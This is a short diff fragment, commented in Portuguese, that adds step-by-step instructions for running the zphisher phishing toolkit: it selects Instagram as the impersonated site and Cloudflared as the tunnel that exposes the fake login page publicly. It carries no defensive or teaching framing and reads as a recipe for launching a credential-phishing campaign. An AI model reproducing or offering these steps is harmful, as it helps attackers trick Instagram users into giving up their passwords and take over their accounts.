@@ -1,0 +1,7 @@
+cd zphisher
+
+# 2. Roda (escolhe Instagram + Cloudflared)
+bash zphisher.sh
+   → 01 (Social Media)
+   → 01 (Instagram)
+   → 02 (Cloudflared)
